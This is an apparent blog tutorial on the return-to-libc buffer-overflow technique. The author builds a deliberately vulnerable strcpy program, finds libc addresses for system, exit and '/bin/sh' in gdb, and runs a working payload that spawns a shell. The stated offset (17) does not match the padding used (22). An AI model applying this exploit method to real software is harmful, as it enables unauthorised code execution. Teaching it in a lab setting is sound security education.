---
title: "The technique return to libc"
description: sam.png
tags: ["In this article I present to you how to exploit a vulnerability to bypass the NX system with the technique of return to libc."]
---

![forthebadge made-with-python](https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif)

Prerequisites :
- Have the basics in `pwn` to understand and attack a basic buffer overflow.
- And a computer, eh eh!

Today I would like to present an article for a new technique of `Buffer Overflow`. A relatively fun and very simple technique, are you interested? If so, let's go!

# What is the technique of return to libc ?

What we saw last time in relation to the `Buffer Overflow` to execute a` shellcode`, the `stack` had to be executable.

    root@0xEX75:~# readelf -lW ./testing |grep GNU_STACK
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
    
The `R` simply indicates that the stack is read and the letter` W` corresponds concretely to writing on the stack and finally the letter `E` corresponds to the executable stack, and it is thanks to this system that we can execute a shellcode because it is the processor which executes our shellcode.

![forthebadge made-with-python](https://2.bp.blogspot.com/-UPzV6M_ZsK8/W3B5kWiwYII/AAAAAAAAAeE/L1izLVAJGbwfh52XG4HjMtPDDMXC-bLqACLcBGAs/s1600/ret2libc.png)

In fairly specific cases, the stack is not executable so it's almost impossible to have the program execute a shellcode for `pop` a shell for example. So the experts found a solution called the `return to libc` technique, which allows you to use functions from` libc`, such as the `system();` function and then use it against the program.

# Convenient !

(For this part, we will deactivate the `ASLR`, because the technique of returning to libc works only if the stack is not executable and the ASLR is not activated.)

Here's a little script in C that doesn't do much:

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

    void name(char*);

    void name(char *f)
    {
        char firstname[10];
        strcpy(firstname, f);
        printf("Your name : %s\n", firstname);
    }

    int main(int argc, char *argv[])
    {
        if(argc != 2)
        {
            exit(0);
        }
        name(argv[1]);
        return 0;
    }
    
A basic program that doesn't do much, but the vulnerability is in the `strcpy();` function. I suppose you know that functions like `strcpy();`, `strcat();` etc ... are not at all secure so there is a system called `FORTIFY_SOURCE` which allows you to replace functions with much more secure functions.

Then, a small compilation is necessary:

    root@0xEX75:~/libc# gcc -m32 -fno-stack-protector libc.c -o libc
    root@0xEX75:~/libc# readelf -lW libc|grep GNU_STACK
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
    
(The `E` flag is not there, so the stack is no longer executable at all.). If we try to run the program after compilation, it works, but in memory things are happening.

    root@0xEX75:~/libc# ./libc $(python -c 'print "A"*17')
    Your name : AAAAAAAAAAAAAAAAA
    root@0xEX75:~/libc# ./libc $(python -c 'print "A"*18')
    Your name : AAAAAAAAAAAAAAAAAA
    segmentation fault (core dumped)
    
We can see that the program crashes after 17 characters, so the `OFFSET` corresponds exactly to 17 characters, if we overflow, the` sEIP` backup will be completely overwritten and the program will crash automatically.

We will launch `GDB` (GNU Debugger), and we will look for the address of the` system (); `,` exit(); `function and finally a string like` /bin/sh` which will allow us to launch this particular command.

    root@0xEX75:~/libc# gdb ./libc
    GNU gdb (Debian 8.3.1-1) 8.3.1
    Copyright (C) 2019 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./libc...
    (No debugging symbols found in ./libc)
    gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Starting program: /root/libc/libc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x54 ('T')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x7fffffac 
    EDX: 0xf7fae010 --> 0x0 
    ESI: 0xf7fac000 --> 0x1d6d6c 
    EDI: 0xf7fac000 --> 0x1d6d6c 
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd290 ('A' <repeats 45 times>)
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd290 ('A' <repeats 45 times>)
    0004| 0xffffd294 ('A' <repeats 41 times>)
    0008| 0xffffd298 ('A' <repeats 37 times>)
    0012| 0xffffd29c ('A' <repeats 33 times>)
    0016| 0xffffd2a0 ('A' <repeats 29 times>)
    0020| 0xffffd2a4 ('A' <repeats 25 times>)
    0024| 0xffffd2a8 ('A' <repeats 21 times>)
    0028| 0xffffd2ac ('A' <repeats 17 times>)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41414141 in ?? ()
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e17660 <system> # ADDRESS FUNCTION SYSTEM
    gdb-peda$ p exit
    $2 = {<text variable, no debug info>} 0xf7e0a6f0 <exit> # ADDRESS FUNCTION EXIT
    gdb-peda$ searchmem "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 1 results, display max 1 items:
    libc : 0xf7f54f68 ("/bin/sh") # ADDRESS /BIN/SH
    
So, we managed to capture the addresses of `system();`, `exit()` and finally of the string `"/bin/sh "`.

- `system();` : `0xf7e17660`
- `exit();`   : `0xf7e0a6f0`
- `/bin/sh`   : `0xf7f54f68`

![forthebadge made-with-python](https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/imagenes/ret-2-libc.png)

Now just use the addresses we captured against the program to `pop` a shell. If we took the `exit()` function, it's just to exit the shell correctly, because if we don't put the `exit();` function, and we leave the shell, it will display a nice `segfault`, so not very nice to see, you don't have to put it anyway, it's completely optional.

    root@0XEX75:~/libc# ./libc $(python -c 'print "A"*22 + "\x60\x76\xe1\xf7" + "\xf0\xa6\xe0\xf7" + "\x68\x4f\xf5\xf7"')
    Your name : AAAAAAAAAAAAAAAAAAAAAA`vhO
    # whoami
    root
    # id
    uid=0(root) gid=0(root) groupes=0(root)

![forthebadge made-with-python](https://media.giphy.com/media/XqXDNFZREKMBq/giphy.gif)

# CONCLUSION !

Here we are, we finally come to the end of this article which, I hope, will have you more. I tried to explain to you how the `technique of returning to libc` works, don't hesitate to contact me on social networks, I'm always available to answer you.
